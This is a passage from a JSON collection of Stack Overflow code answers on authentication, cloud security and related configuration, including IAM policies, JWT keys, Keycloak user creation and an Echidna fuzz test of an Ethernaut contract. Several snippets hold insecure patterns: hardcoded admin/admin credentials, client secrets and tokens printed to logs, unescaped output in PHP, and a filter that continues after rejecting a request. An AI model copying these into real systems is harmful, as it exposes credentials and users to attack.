\"s3:AbortMultipartUpload\",\n        \"s3:ListMultipartUploadParts\",\n        \"s3:DeleteObject*\",\n        \"s3:PutObject*\",\n        \"s3:GetObject*\",\n        \"s3:RestoreObject*\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::BUCKET_NAME/*\"\n      ],\n      \"Condition\": {\n        \"StringLike\": {\n          \"aws:PrincipalTag/department\": [\n            \"hr\"\n          ]\n        }\n      }\n    },\n    {\n      \"Sid\": \"AllowList\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::AWS_ACCOUNT_NUMBER:root\"\n      },\n      \"Action\": [\n        \"s3:ListBucket*\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::BUCKET_NAME\"\n      ],\n      \"Condition\": {\n        \"StringLike\": {\n          \"aws:PrincipalTag/department\": [\n            \"hr\"\n          ]\n        }\n      }\n    }\n  ]\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2020-01-18T22:14:24",
        "author": "WaltDe"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/59779888/verify-offline-an-azure-ad-generated-jwt",
    "title": "Verify offline an Azure AD generated JWT",
    "question_id": 59779888,
    "posted_date": "2020-01-16T20:00:05",
    "answers": [
      {
        "answer_id": 59780919,
        "body": "public static PublicKey getPublicKey(String encodedModulus, String encodedExponent) throws NoSuchAlgorithmException, InvalidKeySpecException {\n        byte[] modulus = Base64.getUrlDecoder().decode(encodedModulus);\n        byte[] exponent = Base64.getUrlDecoder().decode(encodedExponent);\n        StringBuilder sb = new StringBuilder();\n        for (byte b : modulus) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        String sm = sb.toString();\n        sb = new StringBuilder();\n        for (byte b : exponent) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        String se = sb.toString();\n        BigInteger bm = new BigInteger(sm,16);\n        BigInteger be = new BigInteger(se,16);\n        KeyFactory rsa = KeyFactory.getInstance(\"RSA\");\n        PublicKey publicKey = rsa.generatePublic(new RSAPublicKeySpec(bm, be));\n        return publicKey;\n    }\n    public static void main(String[] args) throws Exception {\n        String modulus = \"0XhhwpmEpN-jDBapnzhFbtvEU2BpLLcaLzlXm4mlT2MwKZlXRUUam2vI0URDUYRKaa4O62BCWSSGOv2LGQ6tMD5oU-Dqkuf44bo1hLufIqAALUymssfRurTrLd0fqVA9ZCF3fA8_7xQi5r370m4h-G71ez8eE3lxiVPlwSeJXRpa5QzGA8ApwbXGiV-6liGU4eMXBU39A5rFy6TdioaC4P6xns-IdwlLMWdOR28P4O0yhbVTqcN_kW4N4AQonslB_tGOJGhWJjFkcqsQ8cbiJn6Q6FXoNADXohJO3sAtdUHyBNMXc68i25uTYTe_qyCKuC290TkyR3gxMlw7rtuB1Q\";\n        String exponent = \"AQAB\";\n        byte[] bytes = getPublicKey(modulus, exponent).getEncoded();\n        String encodedString = new String(Base64.getEncoder().encode(bytes));\n        System.out.println(\"-----BEGIN PUBLIC KEY-----\");\n        System.out.println(encodedString);\n        System.out.println(\"-----END PUBLIC KEY-----\");\n        System.out.println();\n    }",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2020-01-16T22:48:18",
        "author": "Jack Jia"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/54876437/only-allow-trusted-applications-for-oauth2-api",
    "title": "Only allow trusted applications for OAuth2 API",
    "question_id": 54876437,
    "posted_date": "2019-02-25T18:43:21",
    "answers": [
      {
        "answer_id": 54883636,
        "body": "#include <jni.h>\n#include <string>\n#include \"api_key.h\"\nextern \"C\" JNIEXPORT jstring JNICALL\nJava_com_criticalblue_androidhidesecrets_MainActivity_stringFromJNI(\n        JNIEnv *env,\n        jobject /* this */) {\n    // To add the API_KEY to the mobile app when is compiled you need to:\n    //   * copy `api_key.h.example` to `api_key.h`\n    //   * edit the file and replace this text `place-the-api-key-here` with your desired API_KEY\n    std::string JNI_API_KEY = ANDROID_HIDE_SECRETS_API_KEY_H;\n    return env->NewStringUTF(JNI_API_KEY.c_str());\n}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2019-02-26T05:43:02",
        "author": "Exadra37"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79148537/keycloak-java-service-account-create-user",
    "title": "KeyCloak Java Service Account Create User",
    "question_id": 79148537,
    "posted_date": "2024-11-01T11:19:41",
    "answers": [
      {
        "answer_id": 79150874,
        "body": "version: '3.6'\nservices:\n  keycloak_web:\n    image: quay.io/keycloak/keycloak:23.0.7\n    container_name: keycloak_web\n    environment:\n      KC_DB: postgres\n      KC_DB_URL: jdbc:postgresql://keycloakdb:5432/keycloak\n      KC_DB_USERNAME: keycloak\n      KC_DB_PASSWORD: password\n      KC_HOSTNAME: localhost\n      KC_HOSTNAME_PORT: 8080\n      KC_HOSTNAME_STRICT: false\n      KC_HOSTNAME_STRICT_HTTPS: false\n      KC_LOG_LEVEL: info\n      KC_METRICS_ENABLED: true\n      KC_HEALTH_ENABLED: true\n      KEYCLOAK_ADMIN: admin\n      KEYCLOAK_ADMIN_PASSWORD: admin\n    command: start-dev\n    depends_on:\n      - keycloakdb\n    ports:\n      - 8080:8080\n  keycloakdb:\n    image: postgres:15\n    volumes:\n      - postgres_data:/var/lib/postgresql/data\n    environment:\n      POSTGRES_DB: keycloak\n      POSTGRES_USER: keycloak\n      POSTGRES_PASSWORD: password\nvolumes:\n  postgres_data:",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2024-11-02T10:33:23",
        "author": "Bench Vue"
      },
      {
        "answer_id": 79150874,
        "body": "package com.example;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.boot.builder.SpringApplicationBuilder;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.http.ResponseEntity;\n@SpringBootApplication\npublic class KeycloakUserRegistrationApplication {\n    public static void main(String[] args) {\n        new SpringApplicationBuilder(KeycloakUserRegistrationApplication.class)\n                .properties(\"server.port=8081\")\n                .run(args);\n    }\n    @Bean\n    public CommandLineRunner run(KeycloakUserService keycloakUserService) {\n        return args -> {\n            User newUser = new User();\n            newUser.setUsername(\"testuser\");  // Setting the required username\n            newUser.setEmail(\"testuser@example.com\");\n            newUser.setFirstName(\"John\");\n            newUser.setLastName(\"Kim\");\n            newUser.setPassword(\"password123\");  // Example password, adjust as needed\n            keycloakUserService.registerUser(newUser);\n        };\n    }\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2024-11-02T10:33:23",
        "author": "Bench Vue"
      },
      {
        "answer_id": 79150874,
        "body": "package com.example;\nimport org.keycloak.OAuth2Constants;\nimport org.keycloak.admin.client.Keycloak;\nimport org.keycloak.admin.client.KeycloakBuilder;\nimport org.keycloak.admin.client.resource.RealmResource;\nimport org.keycloak.admin.client.resource.UsersResource;\nimport org.keycloak.representations.AccessTokenResponse;\nimport org.keycloak.representations.idm.CredentialRepresentation;\nimport org.keycloak.representations.idm.UserRepresentation;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.core.env.Environment;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.stereotype.Service;\nimport javax.ws.rs.core.Response;\n@Service\npublic class KeycloakUserService {\n    @Autowired\n    private Environment environment;\n    private Keycloak getAdminKeycloak() {\n        String serverUrl = environment.getProperty(\"keycloak.server-url\");\n        String masterRealm = environment.getProperty(\"keycloak.master-realm\");\n        String clientId = environment.getProperty(\"keycloak.master-client-id\");\n        String clientSecret = environment.getProperty(\"keycloak.master-client-secret\");\n\n        System.out.println(\"Server URL: \" + serverUrl);\n        System.out.println(\"Master Realm: \" + masterRealm);\n        System.out.println(\"Client ID: \" + clientId);\n        System.out.println(\"Client Secret: \" + clientSecret);\n        // Using the password grant type for admin client\n        return KeycloakBuilder.builder()\n                .serverUrl(serverUrl)\n                .realm(masterRealm)\n                .grantType(OAuth2Constants.PASSWORD)\n                .clientId(\"admin-cli\")\n                .username(\"admin\")  // Ensure this matches the username in Keycloak\n                .password(\"admin\")  // Ensure this matches the password in Keycloak\n                .build();\n    }\n    private Keycloak getClientKeycloak() {\n        String serverUrl = environment.getProperty(\"keycloak.server-url\");\n        String targetRealm = environment.getProperty(\"keycloak.target-realm\");\n        String clientId = environment.getProperty(\"keycloak.client-id\");\n        String clientSecret = environment.getProperty(\"keycloak.client-secret\");\n        System.out.println(\"Target Realm Keycloak Config:\");\n        System.out.println(\"serverUrl: \" + serverUrl);\n        System.out.println(\"targetRealm: \" + targetRealm);\n        System.out.println(\"clientId: \" + clientId);\n        System.out.println(\"clientSecret: \" + clientSecret);\n        // Using client_credentials for non-admin clients\n        Keycloak keycloak = KeycloakBuilder.builder()\n                .serverUrl(serverUrl)\n                .realm(targetRealm)\n                .grantType(OAuth2Constants.CLIENT_CREDENTIALS)\n                .clientId(clientId)\n                .clientSecret(clientSecret)\n                .build();\n        try {\n            AccessTokenResponse tokenResponse = keycloak.tokenManager().getAccessToken();\n            System.out.println(\"Access Token for client: \" + tokenResponse.getToken());\n        } catch (Exception e) {\n            System.out.println(\"Failed to retrieve client access token: \" + e.getMessage());\n        }\n        return keycloak;\n    }\n    public ResponseEntity<String> registerUser(User user) {\n        Keycloak keycloak = getAdminKeycloak();  // Using admin Keycloak instance\n        String targetRealm = environment.getProperty(\"keycloak.target-realm\");\n\n        System.out.println(\"Using target realm: \" + targetRealm);\n        System.out.println(\"Creating user with email: \" + user.getEmail());\n\n        UserRepresentation newUser = new UserRepresentation();\n        newUser.setUsername(user.getUsername());  // Ensure username is set here\n        newUser.setEmail(user.getEmail());\n        newUser.setFirstName(user.getFirstName());\n        newUser.setLastName(user.getLastName());\n        newUser.setEnabled(true);\n\n        RealmResource realmResource = keycloak.realm(targetRealm);\n        UsersResource usersResource = realmResource.users();\n\n        Response response = usersResource.create(newUser);\n        int status = response.getStatus();\n        System.out.println(\"Response status: \" + status);\n\n        if (status == 201) {\n            return new ResponseEntity<>(\"User registration completed successfully.\", HttpStatus.CREATED);\n        } else {\n            String errorResponse = response.readEntity(String.class);\n            System.out.println(\"Response: \" + errorResponse);\n            return new ResponseEntity<>(\"An error occurred while creating the user: \" + errorResponse, HttpStatus.BAD_REQUEST);\n        }\n    }\n\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2024-11-02T10:33:23",
        "author": "Bench Vue"
      },
      {
        "answer_id": 79150874,
        "body": "package com.example;\npublic class User {\n    private String username;\n    private String email;\n    private String password;\n    private String firstName;\n    private String lastName;\n    // Getter and setter for username\n    public String getUsername() {\n        return username;\n    }\n    public void setUsername(String username) {\n        this.username = username;\n    }\n    // Getter and setter for email\n    public String getEmail() {\n        return email;\n    }\n    public void setEmail(String email) {\n        this.email = email;\n    }\n    // Getter and setter for password\n    public String getPassword() {\n        return password;\n    }\n    public void setPassword(String password) {\n        this.password = password;\n    }\n    // Getter and setter for firstName\n    public String getFirstName() {\n        return firstName;\n    }\n    public void setFirstName(String firstName) {\n        this.firstName = firstName;\n    }\n    // Getter and setter for lastName\n    public String getLastName() {\n        return lastName;\n    }\n    public void setLastName(String lastName) {\n        this.lastName = lastName;\n    }\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2024-11-02T10:33:23",
        "author": "Bench Vue"
      },
      {
        "answer_id": 79150874,
        "body": "<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n    <groupId>com.example</groupId>\n    <artifactId>keycloak-user-registration</artifactId>\n    <version>1.0-SNAPSHOT</version>\n    <packaging>jar</packaging>\n    <properties>\n        <java.version>17</java.version>\n        <spring-boot.version>3.1.0</spring-boot.version>\n        <keycloak.version>23.0.7</keycloak.version>\n    </properties>\n    <dependencies>\n        <!-- Spring Boot Starter -->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter</artifactId>\n            <version>${spring-boot.version}</version>\n        </dependency>\n        <!-- Spring Boot Starter Web -->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n            <version>${spring-boot.version}</version>\n        </dependency>\n        <!-- Keycloak Admin Client (downgraded to 18.0.0) -->\n        <dependency>\n            <groupId>org.keycloak</groupId>\n            <artifactId>keycloak-admin-client</artifactId>\n            <version>18.0.0</version>\n        </dependency>\n        <!-- Javax JAX-RS API (for javax.ws.rs.core) -->\n        <dependency>\n            <groupId>javax.ws.rs</groupId>\n            <artifactId>javax.ws.rs-api</artifactId>\n            <version>2.1.1</version>\n        </dependency>\n        <!-- Logback for logging compatibility -->\n        <dependency>\n            <groupId>ch.qos.logback</groupId>\n            <artifactId>logback-classic</artifactId>\n            <version>1.4.7</version>\n        </dependency>\n        <!-- Lombok (Optional for Getter/Setter) -->\n        <dependency>\n            <groupId>org.projectlombok</groupId>\n            <artifactId>lombok</artifactId>\n            <version>1.18.24</version>\n            <scope>provided</scope>\n        </dependency>\n        <!-- Testing Dependencies -->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <version>${spring-boot.version}</version>\n            <scope>test</scope>\n        </dependency>\n        <dependency>\n            <groupId>com.fasterxml.jackson.core</groupId>\n            <artifactId>jackson-databind</artifactId>\n            <version>2.14.3</version>\n        </dependency>\n        <dependency>\n            <groupId>com.fasterxml.jackson.core</groupId>\n            <artifactId>jackson-annotations</artifactId>\n            <version>2.14.3</version>\n        </dependency>\n        <dependency>\n            <groupId>com.fasterxml.jackson.core</groupId>\n            <artifactId>jackson-core</artifactId>\n            <version>2.14.3</version>\n        </dependency>\n    </dependencies>\n    <build>\n        <plugins>\n            <!-- Spring Boot Maven Plugin -->\n            <plugin>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-maven-plugin</artifactId>\n                <version>${spring-boot.version}</version>\n                <executions>\n                    <execution>\n                        <goals>\n                            <goal>repackage</goal>\n                        </goals>\n                    </execution>\n                </executions>\n                <configuration>\n                    <mainClass>com.example.KeycloakUserRegistrationApplication</mainClass>\n                </configuration>\n            </plugin>\n            <!-- Compiler Plugin for Java 17 -->\n            <plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-compiler-plugin</artifactId>\n                <version>3.8.1</version>\n                <configuration>\n                    <source>${java.version}</source>\n                    <target>${java.version}</target>\n                </configuration>\n            </plugin>\n        </plugins>\n    </build>\n</project>",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2024-11-02T10:33:23",
        "author": "Bench Vue"
      },
      {
        "answer_id": 79150874,
        "body": "package com.example;\nimport org.keycloak.OAuth2Constants;\nimport org.keycloak.admin.client.Keycloak;\nimport org.keycloak.admin.client.KeycloakBuilder;\nimport org.keycloak.admin.client.resource.RealmResource;\nimport org.keycloak.admin.client.resource.UsersResource;\nimport org.keycloak.representations.AccessTokenResponse;\nimport org.keycloak.representations.idm.CredentialRepresentation;\nimport org.keycloak.representations.idm.UserRepresentation;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.core.env.Environment;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.stereotype.Service;\nimport javax.ws.rs.core.Response;\nimport org.keycloak.admin.client.resource.UserResource;\n@Service\npublic class KeycloakUserService {\n    @Autowired\n    private Environment environment;\n    private Keycloak getClientKeycloak() {\n        String serverUrl = environment.getProperty(\"keycloak.server-url\");\n        String targetRealm = environment.getProperty(\"keycloak.target-realm\");\n        String clientId = environment.getProperty(\"keycloak.client-id\");\n        String clientSecret = environment.getProperty(\"keycloak.client-secret\");\n\n        System.out.println(\"Target Realm Keycloak Config:\");\n        System.out.println(\"serverUrl: \" + serverUrl);\n        System.out.println(\"targetRealm: \" + targetRealm);\n        System.out.println(\"clientId: \" + clientId);\n        System.out.println(\"clientSecret: \" + clientSecret);\n\n        // Building Keycloak instance using client credentials\n        Keycloak keycloak = KeycloakBuilder.builder()\n                .serverUrl(serverUrl)\n                .realm(targetRealm) // Set to 'my-realm'\n                .grantType(OAuth2Constants.CLIENT_CREDENTIALS)\n                .clientId(clientId) // Set to 'my-client'\n                .clientSecret(clientSecret) // Set to 'my-client' secret\n                .build();\n\n        try {\n            AccessTokenResponse tokenResponse = keycloak.tokenManager().getAccessToken();\n            System.out.println(\"Access Token for client: \" + tokenResponse.getToken());\n        } catch (Exception e) {\n            System.out.println(\"Failed to retrieve client access token: \" + e.getMessage());\n        }\n\n        return keycloak;\n    }\n\n    public ResponseEntity<String> registerUser(User user) {\n        // Using the client Keycloak instance for user registration\n        Keycloak keycloak = getClientKeycloak();\n\n        System.out.println(\"Creating user with email: \" + user.getEmail());\n\n        // Set up the user representation for Keycloak\n        UserRepresentation newUser = new UserRepresentation();\n        newUser.setUsername(user.getUsername());\n        newUser.setEmail(user.getEmail());\n        newUser.setFirstName(user.getFirstName());\n        newUser.setLastName(user.getLastName());\n        newUser.setEnabled(true);\n\n        // Access target realm\n        RealmResource realmResource = keycloak.realm(environment.getProperty(\"keycloak.target-realm\"));\n        UsersResource usersResource = realmResource.users();\n\n        // Create user in Keycloak\n        Response response = usersResource.create(newUser);\n        if (response.getStatus() != 201) {\n            System.out.println(\"Response status: \" + response.getStatus());\n            System.out.println(\"Response: \" + response.readEntity(String.class));\n            return new ResponseEntity<>(\"An error occurred while creating the user\", HttpStatus.BAD_REQUEST);\n        }\n\n        String userId = response.getLocation().getPath().replaceAll(\".*/([^/]+)$\", \"$1\");\n        System.out.println(\"User created with ID: \" + userId);\n        response.close();\n\n        // Set credentials\n        CredentialRepresentation passwordCred = new CredentialRepresentation();\n        passwordCred.setTemporary(false);\n        passwordCred.setType(CredentialRepresentation.PASSWORD);\n        passwordCred.setValue(user.getPassword());\n\n        UserResource userResource = usersResource.get(userId);\n        userResource.resetPassword(passwordCred);\n\n        return new ResponseEntity<>(\"User registration completed successfully.\", HttpStatus.OK);\n    }\n\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2024-11-02T10:33:23",
        "author": "Bench Vue"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78301178/aws-securitylake-roll-up-regions-in-terraform",
    "title": "AWS SecurityLake roll-up regions in Terraform",
    "question_id": 78301178,
    "posted_date": "2024-04-09T17:35:30",
    "answers": [
      {
        "answer_id": 78336176,
        "body": "# eu-west-1\nprovider \"aws\" {\n  region = \"eu-west-1\"\n}\nresource \"aws_securitylake_data_lake\" \"eu_west_1\" {\n  meta_store_manager_role_arn = aws_iam_role.meta_store_manager.arn\n  configuration {\n    region = \"eu-west-1\"\n    # No need to do replication for the eu-west-1 region\n  }\n}\n# eu-west-2\nprovider \"aws\" {\n  region = \"eu-west-2\"\n  alias  = \"eu_west_2\"\n}\nresource \"aws_securitylake_data_lake\" \"eu_west_2\" {\n  provider                    = aws.eu_west_2\n  meta_store_manager_role_arn = aws_iam_role.meta_store_manager.arn\n  configuration {\n    region = \"eu-west-2\"\n    replication_configuration {\n      regions = [\"eu-west-1\"]\n    }\n  }\n}\n# eu-west-3\nprovider \"aws\" {\n  region = \"eu-west-3\"\n  alias  = \"eu_west_3\"\n}\nresource \"aws_securitylake_data_lake\" \"eu_west_3\" {\n  provider                    = aws.eu_west_3\n  meta_store_manager_role_arn = aws_iam_role.meta_store_manager.arn\n  configuration {\n    region = \"eu-west-3\"\n    replication_configuration {\n      regions = [\"eu-west-1\"]\n    }\n  }\n}\n# us-east-1\nprovider \"aws\" {\n  region = \"us-east-1\"\n  alias  = \"us_east_1\"\n}\nresource \"aws_securitylake_data_lake\" \"us_east_1\" {\n  provider                    = aws.us_east_1\n  meta_store_manager_role_arn = aws_iam_role.meta_store_manager.arn\n  configuration {\n    region = \"us-east-1\"\n    replication_configuration {\n      regions = [\"eu-west-1\"]\n    }\n  }\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2024-04-16T12:52:13",
        "author": "Vincent Tjianattan"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77860314/error-trying-to-run-project-access-is-denied-but-user-has-access-to-the-projec",
    "title": "Error trying to run project. Access is denied (But user has access to the project folder)",
    "question_id": 77860314,
    "posted_date": "2024-01-22T08:46:55",
    "answers": [
      {
        "answer_id": 77867403,
        "body": "Microsoft Defender Exploit Guard has blocked an operation that is not authorized by your IT administrator.\nFor more information, contact your IT administrator.\nID: 01443614-CD74-433A-B99E-2ECDC07BFC25\nDetection Duration: 2024-01-22T20:10:46.962Z\nUser: _\nPath: C:\\Users_\\source\\repos____.exe\nProcess Name: C:\\Windows\\explorer.exe\nTarget Command Line:\nParent Command Line: C:\\WINDOWS\\Explorer.EXE\nAffected Folder:\nInheritance Indicator: 0x00000000\nSecurity Intelligence Version: 1.403.2529.0\nEngine Version: 1.1.23110.2\nProduct Version: 4.18.23110.3",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2024-01-23T10:22:50",
        "author": "Alex Tr&#234;me"
      },
      {
        "answer_id": 77867403,
        "body": "Microsoft Defender exploit Guard a bloqu\u00e9 une op\u00e9ration qui n\u2019est pas autoris\u00e9e par votre administrateur informatique.\n pour plus d\u2019informations, contactez votre administrateur informatique.\n \tID : 01443614-CD74-433A-B99E-2ECDC07BFC25\n\tDur\u00e9e de d\u00e9tection : 2024-01-22T20:10:46.962Z\n\tUtilisateur : ____\\____\n\tChemin d\u2019acc\u00e8s : C:\\Users\\____\\source\\repos\\______.exe\n\tNom du processus :  C:\\Windows\\explorer.exe\n\tLigne de commande cible :\n \tLigne de commande parents : C:\\WINDOWS\\Explorer.EXE\n \tDossier concern\u00e9 :\n \tIndicateur d'h\u00e9ritage : 0x00000000\n \tVersion de la veille de s\u00e9curit\u00e9 : 1.403.2529.0\n \tVersion du moteur : 1.1.23110.2\n \tVersion du produit : 4.18.23110.3",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2024-01-23T10:22:50",
        "author": "Alex Tr&#234;me"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77812102/cross-origin-opener-policy-and-window-open-returning-null-in-a-cross-origin-ifra",
    "title": "Cross-Origin-Opener-Policy and window.open returning null in a cross origin iframe even though it opened successfully",
    "question_id": 77812102,
    "posted_date": "2024-01-13T11:02:22",
    "answers": [
      {
        "answer_id": 77814630,
        "body": "from typing import Union\nfrom fastapi import FastAPI, Response\nfrom fastapi.responses import HTMLResponse\napp = FastAPI()\n@app.get(\"/\", response_class=HTMLResponse)\ndef read_root(response: Response):\n    return '''\n        <button id=\"button\">Open</button>\n        <script>\n            document.getElementById(\"button\").addEventListener(\"click\", () => {\n                const w = window.open('https://www.google.com/', \"_blank\", \"noopener\");\n                console.log(w);\n            });\n        </script>\n    '''",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2024-01-14T05:15:26",
        "author": "Michal Charemza"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77393454/uploading-profile-image-on-profile-page",
    "title": "Uploading &quot;Profile Image&quot; on Profile Page",
    "question_id": 77393454,
    "posted_date": "2023-10-31T01:36:30",
    "answers": [
      {
        "answer_id": 77393749,
        "body": "// First execute the prepared query\nif ($stmt->execute()) {\n    // Get the results:\n    $result = $stmt->get_result();\n    // If a profile image is found, echo the image\n    if ($row = $result->fetch_assoc()) {\n        echo '<img src=\"img/' . $row['image_file01'] . '\" >';\n    }\n\n    // No images were found. Here, you do whatever you want.\n    // For example, display a default profile image.\n    // If you want nothing to happen, you can remove this\n    // else statement completely.\n    else {\n        echo \"No image found.\";\n    }\n}\n// Prepared query failed\nelse {\n    echo \"Database error: \" . $stmt->error;\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2023-10-31T02:48:11",
        "author": "Ere M&#228;nnist&#246;"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77126007/react-native-implementing-custom-background-screen-with-flag-secure-on-android",
    "title": "React Native: Implementing Custom Background Screen with FLAG_SECURE on Android",
    "question_id": 77126007,
    "posted_date": "2023-09-18T05:30:01",
    "answers": [
      {
        "answer_id": 77126262,
        "body": "LinearLayout mainLayout, secureLayout;\n@Override\nprotected void onPause() {\n    getWindow().setFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);\n    mainLayout.setVisibility(View.GONE);\n    secureLayout.setVisibility(View.VISIBLE);\n    super.onPause();\n}\n@Override\nprotected void onStart() {\n    getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE,WindowManager.LayoutParams.FLAG_SECURE);\n    mainLayout.setVisibility(View.VISIBLE);\n    secureLayout.setVisibility(View.GONE);\n    super.onResume();\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2023-09-18T06:02:37",
        "author": "DinhNguyen"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77102500/how-to-verify-a-jwkss-integrity-and-authenticity",
    "title": "How to verify a JWKS&#39;s integrity and authenticity",
    "question_id": 77102500,
    "posted_date": "2023-09-14T02:59:59",
    "answers": [
      {
        "answer_id": 77103361,
        "body": "{\n  kid: '-1614245140',\n  x5t: 'lDdNIsb3FxulMcYdAXxYJ_Z5950',   <-- the thumbprint of the certificate used for this signing (should be the last in the x5c)\n  x5c: [                                <-- the certificate chain, starting with the root\n    'MIIDqjCCApKgAwIBAgIESLNEvDA ...',  <-- the root certificate\n    'MIICwzCCAasCCQCKVy9eKjvi+jA ...',  <-- the intermediary certificate\n    'MIIDTDCCAjSgAwIBAgIJAPlnQYH...'    <-- the subject certificate (i.e. the one in the application, e.g. 'oam-jwks'\n  ],\n  alg: 'RS256'  <-- the algorithm used\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2023-09-14T05:05:50",
        "author": "Koos Gadellaa"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76432978/headerwriterfilter-spring-security-adding-default-content-type-iso-8859-1-in-r",
    "title": "HeaderWriterFilter - Spring Security adding default Content-type ISO-8859-1 in response header resulting in No converter exception",
    "question_id": 76432978,
    "posted_date": "2023-06-08T10:38:14",
    "answers": [
      {
        "answer_id": 76443112,
        "body": "@Override\n    public void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)\n      throws IOException, ServletException {\n        try {\n            Authentication authentication = getAuthentication.execute((HttpServletRequest) request);\n            SecurityContextHolder.getContext().setAuthentication(authentication);\n        } catch (Exception exp) {\n            HttpServletResponse httpResponse = (HttpServletResponse) response;\n            httpResponse.setStatus(HttpServletResponse.SC_UNAUTHORIZED);\n            httpResponse.setContentType(MediaType.APPLICATION_JSON_VALUE);\n            PrintWriter writer = httpResponse.getWriter();\n            writer.print(exp.getMessage());\n            writer.flush();\n            writer.close();\n        }\n        filterChain.doFilter(request, response);\n    }",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2023-06-09T15:16:52",
        "author": "Hernan Petringa"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76171925/echidna-fuzzer-is-this-a-false-negative-case-using-hevm",
    "title": "Echidna fuzzer, is this a false-negative case using Hevm?",
    "question_id": 76171925,
    "posted_date": "2023-05-04T06:00:29",
    "answers": [
      {
        "answer_id": 76202057,
        "body": "//SPDX-License-Identifier: AGPL-3.0\npragma solidity ^0.8.0;\nimport \"../Ethernaut22.sol\";\n//Fuzzing Ethernaut22 Contract\n//\ncontract fuzzerEthernaut22 is Ethernaut22{\n    address constant deployer = address(0x20000);\n    address constant dist = address(0x10000);\n    address public token1Address;\n    address public token2Address;\n    event AssertionFailed(string);\n    constructor(){\n        token1Address = address(new Ethernaut22Token(address(this), \"Token1\", \"TKN1\", 110));\n        token2Address = address(new Ethernaut22Token(address(this), \"Token2\", \"TKN2\", 110));\n        Ethernaut22Token(token1Address).transfer(deployer, 110);\n        Ethernaut22Token(token2Address).transfer(deployer, 110);\n    }\n    // Emitting an AssertionFailed because in config.yaml we setted 0x10000 as sender\n    // Passed\n    function check_access_from_another_address_on_set_tokens_function()public{\n        if(msg.sender == owner()){\n            setTokens(token1Address, token2Address);\n            assert(token1 != address(0));\n            assert(token2 != address(0));\n        }else{\n            emit AssertionFailed(\"Sender is not the contract owner!\");\n        }\n    }\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2023-05-08T11:29:56",
        "author": "Matteo Gigli"
      },
      {
        "answer_id": 76202057,
        "body": "approve(address,uint256):  passed! \ud83c\udf89\ntoken2Address():  passed! \ud83c\udf89\ntoken2():  passed! \ud83c\udf89\ncheck_balance_deployer_token1():  passed! \ud83c\udf89\ncheck_owner():  passed! \ud83c\udf89\ncheck_addresses():  passed! \ud83c\udf89\ncheck_balance_deployer_token2():  passed! \ud83c\udf89\naddLiquidity(address,uint256):  passed! \ud83c\udf89\ncheck_access_from_another_address_on_set_tokens_function(): failed!\ud83d\udca5\n  Call sequence:\n    check_access_from_another_address_on_set_tokens_function()\n\nEvent sequence: AssertionFailed(\u00abSender is not the contract owner!\u00bb) from: 0xa329c0648769a73afac7f9381e08fb43dbea72\nowner():  passed! \ud83c\udf89\ngetSwapPrice(address,address,uint256):  passed! \ud83c\udf89\nsetTokens(address,address):  passed! \ud83c\udf89\ntoken1():  passed! \ud83c\udf89\ntoken1Address():  passed! \ud83c\udf89\nswap(address,address,uint256):  passed! \ud83c\udf89\nbalanceOf(address,address):  passed! \ud83c\udf89\nAssertionFailed(..): failed!\ud83d\udca5\n  Call sequence:\n    check_access_from_another_address_on_set_tokens_function()\nEvent sequence: AssertionFailed(\u00abSender is not the 